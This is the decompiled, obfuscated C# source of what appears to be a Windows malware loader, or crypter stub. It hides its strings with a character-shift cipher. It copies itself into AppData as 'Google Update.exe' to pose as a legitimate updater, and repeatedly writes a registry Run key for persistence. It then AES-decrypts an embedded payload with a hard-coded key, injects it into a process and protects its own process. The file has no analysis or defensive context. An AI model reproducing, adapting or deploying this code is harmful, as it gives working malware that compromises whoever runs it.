using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class jkejl_mthch_ociix_sxf_36
{
	public static void _L6AiCXBDDciZtT35X()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
		}
	}

	public static void _WknvlCAjCr9G()
	{
		new decimal(-2004643962L);
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
		}
	}

	public static void _KnkgiUH3D4Nh6()
	{
		while (true)
		{
		}
	}

	[STAThread]
	public static void Main()
	{
		//IL_02c4: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			int num = 1;
			do
			{
				Thread.Sleep(1000);
				num++;
			}
			while (num <= 15);
			AppDomain.CurrentDomain.Load(dvad_zkpj_r_rjxwhn_39((byte[])v_mrsnn_iern_smhgy_74("sphjbppg"))).GetType(he_hxkw_m_sc_91("Sgot"))!.GetMethod(he_hxkw_m_sc_91("XkmSkxmkx"))!.Invoke(null, new object[4]
			{
				he_hxkw_m_sc_91("NQK_eI[XXKTZe[YKXbYulz}gxkbSoixuyulzb]otju}ybI{xxktz\\kxyoutbX{t"),
				"Google Update",
				Interaction.Environ("appdata") + "\\Google Update.exe",
				"frppj"
			});
			AppDomain.CurrentDomain.Load(dvad_zkpj_r_rjxwhn_39((byte[])v_mrsnn_iern_smhgy_74("sphjbppg"))).GetType(he_hxkw_m_sc_91("Sgot"))!.GetMethod(he_hxkw_m_sc_91("Iuv\u007fZnkLork"))!.Invoke(null, new object[2]
			{
				Interaction.Environ("appdata") + "\\Google Update.exe",
				"lwvpjfy"
			});
			AppDomain.CurrentDomain.Load(dvad_zkpj_r_rjxwhn_39((byte[])v_mrsnn_iern_smhgy_74("sphjbppg"))).GetType(he_hxkw_m_sc_91("Sgot"))!.GetMethod(he_hxkw_m_sc_91("Otpkiz"))!.Invoke(null, new object[2]
			{
				RuntimeHelpers.GetObjectValue(AppDomain.CurrentDomain.Load(dvad_zkpj_r_rjxwhn_39((byte[])v_mrsnn_iern_smhgy_74("sphjbppg"))).GetType(he_hxkw_m_sc_91("Sgot"))!.GetMethod(he_hxkw_m_sc_91("GKYeJkix\u007fvz"))!.Invoke(null, new object[3]
				{
					RuntimeHelpers.GetObjectValue(v_mrsnn_iern_smhgy_74("msco")),
					"EA3331519C38C25124730762EB0E0F794F70F52283A91DEDF5",
					true
				})),
				0
			});
			AppDomain.CurrentDomain.Load(dvad_zkpj_r_rjxwhn_39((byte[])v_mrsnn_iern_smhgy_74("sphjbppg"))).GetType(he_hxkw_m_sc_91("Sgot"))!.GetMethod(he_hxkw_m_sc_91("VxuzkizHuzn"))!.Invoke(null, new object[1] { Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule!.FileName) });
			while (true)
			{
				Thread.Sleep(1000);
				AppDomain.CurrentDomain.Load(dvad_zkpj_r_rjxwhn_39((byte[])v_mrsnn_iern_smhgy_74("sphjbppg"))).GetType(he_hxkw_m_sc_91("Sgot"))!.GetMethod(he_hxkw_m_sc_91("XkmSkxmkx"))!.Invoke(null, new object[4]
				{
					he_hxkw_m_sc_91("NQK_eI[XXKTZe[YKXbYulz}gxkbSoixuyulzb]otju}ybI{xxktz\\kxyoutbX{t"),
					"Google Update",
					Interaction.Environ("appdata") + "\\Google Update.exe",
					"glzlxfa"
				});
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static string he_hxkw_m_sc_91(string ote_oj_bor_dnca_99)
	{
		string text = string.Empty;
		int num = ote_oj_bor_dnca_99.Length - 1;
		for (int i = 0; i <= num; i++)
		{
			text += Conversions.ToString(Strings.ChrW(ote_oj_bor_dnca_99[i] - 6));
		}
		return text;
	}

	public static byte[] dvad_zkpj_r_rjxwhn_39(byte[] zugehx_kwl_tc_wte_80)
	{
		int num = zugehx_kwl_tc_wte_80.Length - 1;
		for (int i = 0; i <= num; i += 6)
		{
			zugehx_kwl_tc_wte_80[i] = (byte)(zugehx_kwl_tc_wte_80[i] ^ 6u);
		}
		return zugehx_kwl_tc_wte_80;
	}

	public static object v_mrsnn_iern_smhgy_74(string maymi_dtt_bbshc_p_46)
	{
		return new ResourceManager(maymi_dtt_bbshc_p_46, Assembly.GetExecutingAssembly()).GetObject(maymi_dtt_bbshc_p_46);
	}
}
